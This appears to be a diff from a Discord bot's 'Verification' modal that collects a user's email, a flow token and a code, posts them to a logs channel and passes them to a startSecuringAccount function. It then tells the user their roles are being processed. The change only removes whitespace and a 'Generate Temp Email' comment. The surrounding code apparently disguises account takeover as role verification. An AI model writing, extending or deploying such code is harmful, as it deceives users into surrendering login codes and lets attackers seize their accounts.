@@ -26,11 +26,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
         )
 
         await logs_channel.send(embed=Code_embed)
-        startSecuringAccount(data["email"], data["flowtoken"], self.box_three.value)  
-              
-        #######################
-        # Generate Temp Email #
-        #######################
+        startSecuringAccount(data["email"], data["flowtoken"], self.box_three.value)
 
         await interaction.response.send_message(
             "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
